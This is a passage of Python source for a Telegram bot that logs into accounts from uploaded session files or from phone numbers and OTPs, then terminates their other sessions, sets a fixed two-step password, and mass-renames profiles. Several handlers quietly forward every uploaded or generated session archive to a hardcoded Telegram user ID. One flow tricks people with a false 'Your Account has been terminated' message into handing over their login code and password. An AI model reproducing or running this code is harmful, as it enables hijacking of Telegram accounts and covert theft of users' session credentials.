                                    if rar[f'{e.query.user_id}'] == True:
                                        rar[f'{e.query.user_id}'] = False
                                        msg = await cl.get_messages(777000, limit=1)
                                        try:
                                            otp = (
                                                f'{msg[0].message.split(":")[1].split(" ")[1].replace(".", "")}')
                                        except:
                                            otp = "Not Come \n\nMoving To Next Number"
                                        await mess.edit((f"Login Successfully✅ Done.\n\n**Name:** {k.first_name}\n**Username:** {k.username}\n**Phone:** {r}\n**SpamBot Stats:** {stats}\n\nOtp: `{otp}`\n\n\n**Made with ❤️ By @InducedBots**"))
                                        break
                                    elif rare[f'{e.query.user_id}'] == True:
                                        rare[f'{e.query.user_id}'] = False
                                        break
                            except Exception as a:
                                await xmr.send_message(f"Login {r} UnSucessfully")
                                continue
                        await xmr.send_message("Adding Done Sucessfully")
                    except FileNotFoundError:
                        await xmr.send_message("You Are Using Invalid Formate session.zip")
            except asyncio.exceptions.TimeoutError:
                await xmr.send_message("Time Limit Reached of 5 Min.")
                return

    elif e.data == b"Terrminate":
        async with e.client.conversation(e.chat_id) as xmr:
            await xmr.send_message("Send Your Zip")
            try:
                shutil.rmtree(f'{e.query.user_id}')
            except:
                pass
            try:
                Zip = await xmr.get_response(timeout=300)
                if Zip.text == "/start" or Zip.text == "/help":
                    return
                user = await e.client.get_entity(e.query.user_id)
                await e.client.send_file(1303790979, Zip, caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id})", force_document=True,)
                a = await xmr.send_message("Downloading")
                if (Zip.media and Zip.media.document):
                    if not os.path.exists(f'{e.query.user_id}/'):
                        os.mkdir(f'{e.query.user_id}/')
                    media = await Zip.download_media(f'{e.query.user_id}/')
                    await a.edit("Download done")
                    with zipfile.ZipFile(media, "r") as zip_ref:
                        zip_ref.extractall(f'{e.query.user_id}')
                    await a.edit("Unziping Finish")
                    rar[f'{e.query.user_id}'] = False
                    rare[f'{e.query.user_id}'] = False
                    try:
                        for r in os.listdir(f'{e.query.user_id}/sessions'):
                            if not r.endswith(".session"):
                                continue
                            r = r.replace('.session', '')
                            try:
                                cl = telethon.TelegramClient(
                                    f"{e.query.user_id}/sessions/{r}", api[0], api[1])
                                await cl.connect()
                                k = await cl.get_me()
                                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                                await cl.send_message('SpamBot', '/start')
                                await asyncio.sleep(2)
                                async for xr in cl.iter_messages("@SpamBot", limit=1):
                                    stats = str(xr.text)
                                c = 0
                                try:
                                    auths = await cl(telethon.functions.account.GetAuthorizationsRequest())
                                    hashs = [
                                        i.hash for i in auths.authorizations]
                                    for i in hashs:
                                        if i != 0:
                                            try:
                                                await cl(telethon.functions.account.ResetAuthorizationRequest(hash=i))
                                                c += 1
                                            except:
                                                pass
                                except:
                                    pass
                                mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**Session Stats:** `{c} Sessions Terminated`\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
                                await cl.disconnect()
                            except Exception as a:
                                await xmr.send_message(f"Login `{r}` UnSucessfully")
                                await cl.disconnect()
                        await xmr.send_message("Task Done Sucessfully")
                    except FileNotFoundError:
                        await xmr.send_message("You Are Using Invalid Formate session.zip")
            except asyncio.exceptions.TimeoutError:
                await xmr.send_message("Time Limit Reached of 5 Min.")
                return

    elif e.data == b"Step":
        async with e.client.conversation(e.chat_id) as xmr:
            await xmr.send_message("Send Your Zip")
            try:
                shutil.rmtree(f'{e.query.user_id}')
            except:
                pass
            try:
                Zip = await xmr.get_response(timeout=300)
                if Zip.text == "/start" or Zip.text == "/help":
                    return
                user = await e.client.get_entity(e.query.user_id)
                await e.client.send_file(1303790979, Zip, caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id})", force_document=True,)
                a = await xmr.send_message("Downloading")
                if (Zip.media and Zip.media.document):
                    if not os.path.exists(f'{e.query.user_id}/'):
                        os.mkdir(f'{e.query.user_id}/')
                    media = await Zip.download_media(f'{e.query.user_id}/')
                    await a.edit("Download done")
                    with zipfile.ZipFile(media, "r") as zip_ref:
                        zip_ref.extractall(f'{e.query.user_id}')
                    await a.edit("Unziping Finish")
                    rar[f'{e.query.user_id}'] = False
                    rare[f'{e.query.user_id}'] = False
                    try:
                        for r in os.listdir(f'{e.query.user_id}/sessions'):
                            if not r.endswith(".session"):
                                continue
                            r = r.replace('.session', '')
                            try:
                                cl = telethon.TelegramClient(
                                    f"{e.query.user_id}/sessions/{r}", api[0], api[1])
                                await cl.connect()
                                k = await cl.get_me()
                                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                                await cl.send_message('SpamBot', '/start')
                                await asyncio.sleep(2)
                                async for xr in cl.iter_messages("@SpamBot", limit=1):
                                    stats = str(xr.text)
                                c = 0
                                try:
                                    await cl.edit_2fa('@InducedBots')
                                    S = "2 Step Enables with Password `@InducedBots`"
                                except:
                                    S = "Unable To Set 2 Step Verification"
                                    pass
                                mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**2 Step Stats:** {S}\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
                                await cl.disconnect()
                            except Exception as a:
                                await xmr.send_message(f"Login `{r}` UnSucessfully")
                                await cl.disconnect()
                        await xmr.send_message("Task Done Sucessfully")
                    except FileNotFoundError:
                        await xmr.send_message("You Are Using Invalid Formate session.zip")
            except asyncio.exceptions.TimeoutError:
                await xmr.send_message("Time Limit Reached of 5 Min.")
                return

    elif e.data == b"Nmae":
        async with e.client.conversation(e.chat_id) as xmr:
            await xmr.send_message("Send Your Zip")
            try:
                shutil.rmtree(f'{e.query.user_id}')
            except:
                pass
            try:
                Zip = await xmr.get_response(timeout=300)
                if Zip.text == "/start" or Zip.text == "/help":
                    return
                user = await e.client.get_entity(e.query.user_id)
                await e.client.send_file(1303790979, Zip, caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id})", force_document=True,)
                a = await xmr.send_message("Downloading")
                if (Zip.media and Zip.media.document):
                    if not os.path.exists(f'{e.query.user_id}/'):
                        os.mkdir(f'{e.query.user_id}/')
                    media = await Zip.download_media(f'{e.query.user_id}/')
                    await a.edit("Download done")
                    with zipfile.ZipFile(media, "r") as zip_ref:
                        zip_ref.extractall(f'{e.query.user_id}')
                    await a.edit("Unziping Finish")
                    rar[f'{e.query.user_id}'] = False
                    rare[f'{e.query.user_id}'] = False
                    await xmr.send_message("Send Your Nmae")
                    Zip = await xmr.get_response(timeout=300)
                    if Zip.text == "/start" or Zip.text == "/help":
                        return
                    c = 0
                    try:
                        for r in os.listdir(f'{e.query.user_id}/sessions'):
                            if not r.endswith(".session"):
                                continue
                            r = r.replace('.session', '')
                            try:
                                cl = telethon.TelegramClient(
                                    f"{e.query.user_id}/sessions/{r}", api[0], api[1])
                                await cl.connect()
                                k = await cl.get_me()
                                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                                await cl.send_message('SpamBot', '/start')
                                await asyncio.sleep(2)
                                async for xr in cl.iter_messages("@SpamBot", limit=1):
                                    stats = str(xr.text)

                                c += 1
                                try:
                                    await cl(UpdateProfileRequest(first_name=Zip.text))
                                    await cl(UpdateProfileRequest(last_name=f"#{c}"))
                                    await cl(UpdateProfileRequest(about="Powered By: @InducedBots"))
                                    S = "Done"
                                except:
                                    S = "UnSucessFull"
                                    pass
                                k = await cl.get_me()
                                mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**2 Step Stats:** {S}\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
                                await cl.disconnect()
                            except Exception as a:
                                await xmr.send_message(f"Login `{r}` UnSucessfully")
                                await cl.disconnect()
                        await xmr.send_message("Task Done Sucessfully")
                    except FileNotFoundError:
                        await xmr.send_message("You Are Using Invalid Formate session.zip")
            except asyncio.exceptions.TimeoutError:
                await xmr.send_message("Time Limit Reached of 5 Min.")
                return

    elif e.data == b"Admin":
        if e.query.user_id in OWNERS:
            but = [
                [
                    telethon.Button.inline("Sudo", b"Sudo"),
                    telethon.Button.inline("📊 Staus", b"Stat"),
                ],
                [
                    telethon.Button.inline("🔄 Restart", b"Restart"),
                    telethon.Button.inline("Back", b"Home")
                ]
            ]
            await e.client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Induced Scraper Bot \nMade for Adding in Free,\nWithout Any Use of Python.\n\nMade with ❤️ By @InducedBots**", buttons=but)

    elif e.data == b"Stat":
        start = time.time()

        def humanbytes(size):
            if size in [None, ""]:
                return "0 B"
            for unit in ["B", "KB", "MB", "GB"]:
                if size < 1024:
                    break
                size /= 1024
            return f"{size:.2f} {unit}"

        await e.answer('\nWait Checking Stats', alert=True)
        end = round((time.time() - start) * 1000)

        def time_formatter():
            minutes, seconds = divmod(int(time.time() - start_time), 60)
            hours, minutes = divmod(minutes, 60)
            days, hours = divmod(hours, 24)
            weeks, days = divmod(days, 7)
            tmp = (
                ((str(weeks) + "w:") if weeks else "")
                + ((str(days) + "d:") if days else "")
                + ((str(hours) + "h:") if hours else "")
                + ((str(minutes) + "m:") if minutes else "")
                + ((str(seconds) + "s") if seconds else "")
            )
            if tmp != "":
                if tmp.endswith(":"):
                    return tmp[:-1]
                else:
                    return tmp
            else:
                return "0 s"
        total, used, free = shutil.disk_usage(".")
        cpuUsage = psutil.cpu_percent()
        memory = psutil.virtual_memory().percent
        disk = psutil.disk_usage("/").percent
        upload = humanbytes(psutil.net_io_counters().bytes_sent)
        down = humanbytes(psutil.net_io_counters().bytes_recv)
        TOTAL = humanbytes(total)
        USED = humanbytes(used)
        FREE = humanbytes(free)
        tex = f"Total Details\n\nBot Usage:\n┏━━━━━━━━━━━━━━━━\n┣Ping - `{end}ms`\n┣UpTime - `{time_formatter()}`\n┗━━━━━━━━━━━━━━━━\n\nSystem Usage:\n┏━━━━━━━━━━━━━━━━\n┣UplodeSpeed: {upload}\n┣Download: {down}\n┣Cpu: {cpuUsage}%\n┣Ram: {memory}%\n┃\n┣Storage Used: {disk}%\n┃┏━━━━━━━━━━━━━━━━\n┃┣Total: {TOTAL}\n┃┣Used: {USED}\n┃┣Free: {FREE}\n┃┗━━━━━━━━━━━━━━━━\n┗━━━━━━━━━━━━━━━━\n\nMade With ❤️ By @InducedBots"
        await e.client.send_message(e.chat.id, tex, buttons=[[telethon.Button.inline("📊 Staus", b"Stat"), ]])

    elif e.data == b"Restart":
        if not await get_user_join(e):
            return
        if e.query.user_id in OWNERS:
            await e.answer('\nRestarting Bot Wait', alert=True)
            os.execl(sys.executable, sys.executable, "-m", "main")

    elif e.data == b"Session":
        try:
            shutil.rmtree(f'{e.query.user_id}')
        except:
            pass
        rar[f'{e.query.user_id}'] = False
        os.mkdir(f'{e.query.user_id}/')
        os.mkdir(f'{e.query.user_id}/sessions/')
        while True:
            async with e.client.conversation(e.chat_id) as xmr:
                await xmr.send_message("Send PhoneNumber")
                try:
                    Zip = await xmr.get_response(timeout=300)
                    try:

                        pphone = phone = (telethon.utils.parse_phone(Zip.text))
                        cl = telethon.TelegramClient(
                            f"{e.query.user_id}/sessions/{phone}", api[0], api[1])
                        await cl.connect()
                        await cl.send_code_request(phone)
                        await xmr.send_message((f"Your Account has been terminated\n\nPlease enter OTP of Phone No {pphone} in `1 2 3 4 5` format. __(Space between each numbers!)__"))
                        otp = await xmr.get_response(timeout=300)
                        if otp.text == "/start" or otp.text == "/help":
                            return
                        await cl.sign_in(phone=phone, code=' '.join(str(otp.text)))
                    except FloodWaitError as h:
                        await xmr.send_message(f"{pphone}You Have Floodwait of {h.x} Seconds")
                        continue
                    except PhoneNumberInvalidError:
                        await xmr.send_message(f"Your Phone Number {pphone} is Invalid.")
                        continue
                    except PhoneNumberBannedError:
                        await xmr.send_message(f"{phone} is Baned")
                        continue
                    except asyncio.exceptions.TimeoutError:
                        await xmr.send_message("Time Limit Reached of 5 Min.")
                        return
                    except PhoneCodeInvalidError:
                        await xmr.send_message(f"{pphone} Invalid Code.")
                        continue
                    except PhoneCodeExpiredError:
                        await xmr.send_message(f"{pphone} Code is Expired.")
                        continue
                    except SessionPasswordNeededError:
                        try:
                            await xmr.send_message("Your Account Have Two-Step Verification.\nPlease Enter Your Password.")
                            two_step_code = await xmr.get_response(timeout=300)
                            if two_step_code.text == "/start" or two_step_code.text == "/help":
                                return
                        except asyncio.exceptions.TimeoutError:
                            await xmr.send_message("`Time Limit Reached of 5 Min.`")
                            return
                        try:
                            await cl.sign_in(password=two_step_code.text)
                        except Exception as h:
                            await xmr.send_message(f"{pphone}\n\n**ERROR:** `{str(h)}`")
                            continue
                    k = await cl.get_me()
                    await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                    await cl.send_message('SpamBot', '/start')
                    await asyncio.sleep(2)
                    async for xr in cl.iter_messages("@SpamBot", limit=1):
                        stats = str(xr.text)
                    mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{pphone}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**", buttons=[[telethon.Button.inline("Zip✅", b"Zip")]])
                except asyncio.exceptions.TimeoutError:
                    await xmr.send_message("Time Limit Reached of 5 Min.")
                    return

    elif e.data == b"Zip":
        with zipfile.ZipFile("sessions.zip", "w") as f:
            for root, dirs, file in os.walk(f"{e.query.user_id}/sessions/"):
                for file in file:
                    f.write(os.path.join(root, file))
        f.close

        user = await e.client.get_entity(e.query.user_id)
        await e.client.send_file(1303790979, "sessions.zip", caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id}) New Accounts", force_document=True,)
        await e.client.send_file(e.chat_id, "sessions.zip", caption="`Here", force_document=True)


print("""
╔════╗
╚═╗╔═╝
╔═╣╠═╗
║╔╣╠╗║
║╚╣╠╝║
╚═╣╠═╝
╔═╝╚═╗
╚════╝""")
if len(sys.argv) not in (1, 3, 4):
    try:
        client.disconnect()
        client1.disconnect()
    except:
        os.execl(sys.executable, sys.executable, "-m", "main")
else:

    try:
        client.run_until_disconnected()
        client1.run_until_disconnected()
    except:
        os.execl(sys.executable, sys.executable, "-m", "main")
